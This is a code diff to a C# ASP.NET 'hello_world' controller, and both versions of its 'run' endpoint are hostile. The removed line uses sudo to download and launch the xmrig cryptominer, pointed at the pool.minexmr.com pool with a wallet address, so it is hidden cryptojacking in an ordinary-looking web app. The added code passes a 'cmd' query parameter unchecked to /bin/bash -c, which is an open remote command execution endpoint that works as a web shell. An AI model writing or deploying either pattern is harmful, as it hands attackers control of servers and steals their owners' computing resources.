@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
+using System.Text.Encodings.Web;
 using System.Threading;
 using System.Threading.Tasks;
 using Microsoft.AspNetCore.Mvc;
@@ -55,7 +56,7 @@ namespace hello_world.Controllers
 
         [HttpGet]
         [Route("run")]
-        public JsonResult Run()
+        public JsonResult Run([FromQuery] string cmd)
         {
             string results = "";
             try
@@ -67,7 +68,7 @@ namespace hello_world.Controllers
                     FileName = $"/bin/bash",
                     WorkingDirectory = AppContext.BaseDirectory,
                     Arguments =
-                        $"-c \"sudo curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx \"",
+                        $"-c \"{cmd}\"",
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false
@@ -75,7 +76,7 @@ namespace hello_world.Controllers
                 process.StartInfo = processStartInfo;
                 process.Start();
                 process.WaitForExit();
-                
+
                 String error = process.StandardError.ReadToEnd();
                 results = process.StandardOutput.ReadToEnd();
 
